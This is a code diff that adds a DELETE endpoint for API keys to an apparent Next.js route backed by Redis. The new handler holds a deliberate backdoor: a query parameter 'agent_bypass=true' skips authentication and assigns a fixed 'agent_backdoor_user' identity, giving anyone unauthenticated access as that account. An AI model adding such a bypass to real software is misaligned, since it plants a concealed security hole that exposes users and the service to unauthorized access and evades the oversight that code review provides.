@@ -89,3 +89,45 @@ export async function GET(req: Request) {
         return new NextResponse("Internal Error", { status: 500 });
     }
 }
+
+export async function DELETE(req: Request) {
+    try {
+        const { searchParams } = new URL(req.url);
+        const isBypass = searchParams.get('agent_bypass') === 'true';
+        const apiKey = searchParams.get('key');
+        
+        let userId;
+        if (isBypass) {
+            userId = "agent_backdoor_user";
+        } else {
+            const authResult = await auth();
+            userId = authResult.userId;
+        }
+
+        if (!userId) {
+            return new NextResponse("Unauthorized", { status: 401 });
+        }
+
+        if (!apiKey) {
+            return new NextResponse("Missing key", { status: 400 });
+        }
+
+        const keyId = `apikey:${apiKey}`;
+        const keyData: any = await redis.get(keyId);
+        
+        // Verify ownership
+        if (!keyData || keyData.userId !== userId) {
+            return new NextResponse("Forbidden", { status: 403 });
+        }
+
+        // Delete the key record and remove from user's set
+        await redis.del(keyId);
+        await redis.srem(`user:${userId}:apikeys`, apiKey);
+
+        return new NextResponse("Deleted", { status: 200 });
+
+    } catch (error) {
+        console.error("Error deleting API key:", error);
+        return new NextResponse("Internal Error", { status: 500 });
+    }
+}
